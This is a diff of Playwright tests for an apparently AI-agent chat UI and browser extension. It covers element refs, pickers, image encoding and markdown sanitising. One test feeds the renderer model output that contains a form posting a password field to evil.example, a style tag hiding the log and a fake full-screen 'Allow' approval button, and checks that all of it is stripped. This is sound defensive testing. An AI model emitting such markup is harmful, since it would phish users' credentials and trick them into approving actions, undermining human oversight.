@@ -674,6 +674,102 @@ def test_wait_probe_reports_each_condition(page, server):
     assert isinstance(page.evaluate("() => ctWaitProbe({}).resources"), int)
 
 
+def test_find_refs_stay_unique_across_injections(page, server):
+    """page-read.js is injected again for every call; its ref counter used to
+    restart at 0 while the old refs stayed on the page, so the second find
+    handed out the first one's ref (reproduced: Delete f1, Cancel f1)."""
+    script = os.path.join(os.path.dirname(__file__), "..", "..", "extension", "page-read.js")
+    page.set_content("<button>Delete</button><button>Cancel</button><button>Save</button>")
+    page.add_script_tag(path=script)
+    d = page.evaluate("() => ctFind({ role: 'button', name: 'delete' }).matches[0].ref")
+    page.add_script_tag(path=script)
+    c = page.evaluate("() => ctFind({ role: 'button', name: 'cancel' }).matches[0].ref")
+    assert d != c, (d, c)
+    page.add_script_tag(path=script)
+    s = page.evaluate("() => ctReadPage('forms')") and page.evaluate("() => ctFind({ role: 'button', name: 'save' }).matches[0].ref")
+    assert len({d, c, s}) == 3, (d, c, s)
+    for ref, name in ((d, "Delete"), (c, "Cancel"), (s, "Save")):
+        assert page.evaluate("(r) => [...document.querySelectorAll('[data-ct-ref=\"' + r + '\"]')].map(e => e.textContent)", ref) == [name]
+    assert page.evaluate("() => ctFind({ role: 'button', name: 'delete' }).matches[0].ref") == d, "an element keeps its ref"
+
+
+def test_model_markdown_cannot_style_or_fake_a_card(page, server):
+    """Model output renders next to the approval cards. It may not bring
+    <style>, forms, buttons or class/style/id with it; markdown still works."""
+    open_ui(page, server)
+    page.evaluate("""() => handle({ kind: 'text', text: 'Hi <style>#log{display:none}</style>'
+      + '<form action="https://evil.example/x" method="post"><input name="pw"><textarea>t</textarea><select><option>1</option></select>'
+      + '<button class="approve allow" id="approve" style="color:red" type="submit">Allow</button></form>'
+      + ' <span class="card approval" style="position:fixed;inset:0" id="x">covering</span>'
+      + '\\n\\n[a link](https://ok.example/) and `code`\\n\\n- one\\n- two\\n\\n| a | b |\\n|---|---|\\n| 1 | 2 |\\n\\n![pic](https://ok.example/i.png)' })""")
+    page.wait_for_selector("#log .msg.md table", timeout=SHORT)
+    html = page.evaluate("() => [...document.querySelectorAll('#log .msg.md')].at(-1).innerHTML")
+    for tag in ("<style", "<form", "<input", "<textarea", "<select", "<button"):
+        assert tag not in html, (tag, html)
+    for attr in (" class=", " style=", " id=", " action="):
+        assert attr not in html, (attr, html)
+    assert '<a href="https://ok.example/">a link</a>' in html and "<code>code</code>" in html, html
+    assert "<li>one</li>" in html and "<td>1</td>" in html and '<img src="https://ok.example/i.png" alt="pic">' in html, html
+    assert page.is_visible("#log"), "the reply could not hide the log"
+
+
+def test_browser_picker_auto_unpins_and_a_missing_pin_is_shown(page, server):
+    """Picking auto sends "" (the server unpins); a pinned browser that
+    disconnects stays selected, marked, instead of the picker silently
+    showing auto while the chat is still pinned to it."""
+    open_ui(page, server)
+    page.evaluate("() => { window.__sent = []; const s = ws.send.bind(ws); ws.send = (d) => { __sent.push(JSON.parse(d)); s(d); }; }")
+    page.evaluate("() => paintBrowsers([{ id: 'aaaaaa-browser' }, { id: 'bbbbbb-browser' }])")
+    page.select_option("#browser", "aaaaaa-browser")
+    page.evaluate("() => paintBrowsers([{ id: 'bbbbbb-browser' }])")
+    assert page.eval_on_selector("#browser", "s => s.value") == "aaaaaa-browser"
+    assert "not connected" in page.eval_on_selector("#browser", "s => s.selectedOptions[0].textContent")
+    assert page.is_visible("#browser")
+    page.select_option("#browser", "")
+    assert page.evaluate("() => __sent.filter(m => m.type === 'browser').map(m => m.instance)") == ["aaaaaa-browser", ""]
+    assert page.eval_on_selector("#browser", "s => [...s.options].map(o => o.value)") == ["", "bbbbbb-browser"]
+
+
+def test_thinking_after_a_chat_switch_shows_in_the_log(page, server):
+    """A switch or reconnect empties the log; a thinking block that was
+    streaming must be forgotten with it, or the next one streams into a
+    detached element and is never seen."""
+    open_ui(page, server)
+    page.evaluate("() => handle({ kind: 'thinking_delta', text: 'first' })")
+    page.evaluate("() => handle({ kind: 'cleared' })")
+    page.evaluate("() => handle({ kind: 'thinking_delta', text: 'second thought' })")
+    wait(page, "() => [...document.querySelectorAll('#log .think .tt')].some(t => t.textContent === 'second thought')", what="the thinking block in the log")
+
+
+def test_model_picker_labels_an_unlisted_model_and_drops_it_on_switch(page, server):
+    open_ui(page, server)
+    listed = "[{ value: 'default', label: 'Default (Opus)' }, { value: 'sonnet', label: 'Sonnet' }]"
+    page.evaluate(f"() => {{ handle({{ kind: 'models', models: {listed} }}); handle({{ kind: 'model', model: 'claude-retired-1' }}); }}")
+    assert page.eval_on_selector("#model", "s => s.selectedOptions[0].textContent") == "claude-retired-1 (not listed)"
+    # another chat: the server sends cleared, the list, then that chat's model
+    page.evaluate(f"() => {{ handle({{ kind: 'cleared' }}); handle({{ kind: 'models', models: {listed} }}); handle({{ kind: 'model', model: 'sonnet' }}); }}")
+    assert page.eval_on_selector("#model", "s => [...s.options].map(o => o.value)") == ["", "sonnet"]
+    assert page.eval_on_selector("#model", "s => s.value") == "sonnet"
+
+
+def test_a_large_pasted_png_is_encoded_not_emptied(page, server):
+    """A PNG too big to keep as PNG is re-encoded as JPEG. That used to read
+    the bitmap's size after closing it (0×0) and send "data:,", which the
+    server refused along with the whole message."""
+    open_ui(page, server)
+    r = page.evaluate("""async () => {
+      const c = document.createElement('canvas'); c.width = 1400; c.height = 1400;
+      const g = c.getContext('2d'); const d = g.createImageData(1400, 1400);
+      for (let i = 0; i < d.data.length; i++) d.data[i] = (i % 4 === 3) ? 255 : (Math.random() * 256) | 0;
+      g.putImageData(d, 0, 0);
+      const blob = await new Promise((res) => c.toBlob(res, 'image/png'));
+      const e = await encodeImage(new File([blob], 'shot.png', { type: 'image/png' }));
+      const img = new Image(); img.src = 'data:' + e.media_type + ';base64,' + e.data; await img.decode();
+      return { type: e.media_type, len: e.data.length, w: img.naturalWidth, h: img.naturalHeight };
+    }""")
+    assert r["type"] == "image/jpeg" and r["len"] > 10000 and (r["w"], r["h"]) == (1400, 1400), r
+
+
 def test_reply_tables_have_lines(page, server):
     open_ui(page, server)
     page.evaluate("() => handle({ kind: 'text', text: '| txn | € |\\n|---|---|\\n| T1052 | 171,24 |\\n| T1095 | 53,84 |' })")
@@ -855,6 +951,31 @@ def test_extension_eval_awaits_promises(ext_pages):
         r = call(sw, "throw new SyntaxError('mine')"); assert r["ok"] is False and "mine" in r["e"], r
         r = call(sw, "new Promise(() => {})", 2000); assert r == {"timeout": True}, "a never-settling promise is capped at 30 s, beyond this test's patience — it must at least not break the worker"
         assert call(sw, "2 * 21") == {"ok": True, "r": 42}, "the worker still answers after a pending eval"
+    finally:
+        srv.shutdown()
+
+
+@pytest.mark.xdist_group("chromium")
+def test_extension_snapshot_refs_never_point_at_two_elements(ext_pages):
+    """snapshot numbers refs by position. An element the next snapshot skips
+    (hidden) kept its old ref while another element was given the same one,
+    and a click on it went to the hidden element that came first."""
+    html = b"""<button id=a>A</button><button id=b onclick="window.hit='B'">B</button><button id=c onclick="window.hit='C'">C</button>"""
+    srv = serve_html(html); port = srv.port
+    ctx = ext_pages
+    call = lambda sw, action, params: sw.evaluate("([a, p]) => ctHandle(a, p)", [action, params])
+    try:
+        sw = ctx.sw
+        page = ctx.new_page(); page.goto(f"http://127.0.0.1:{port}/"); time.sleep(0.3)
+        tab = sw.evaluate("() => chrome.tabs.query({}).then(t => t.filter(x => x.url.startsWith('http'))[0].id)")
+        first = {e["text"]: e["ref"] for e in call(sw, "snapshot", {"tabId": tab})["elements"]}
+        assert first == {"A": "e1", "B": "e2", "C": "e3"}, first
+        page.evaluate("() => { document.getElementById('a').remove(); document.getElementById('b').style.display = 'none'; }")
+        second = {e["text"]: e["ref"] for e in call(sw, "snapshot", {"tabId": tab})["elements"]}
+        assert second == {"C": "e2"}, second
+        assert page.evaluate("() => [...document.querySelectorAll('[data-ct-ref=e2]')].map(e => e.id)") == ["c"], "the hidden B no longer carries e2"
+        call(sw, "click", {"tabId": tab, "ref": "e2"})
+        assert page.evaluate("() => window.hit") == "C"
     finally:
         srv.shutdown()
 
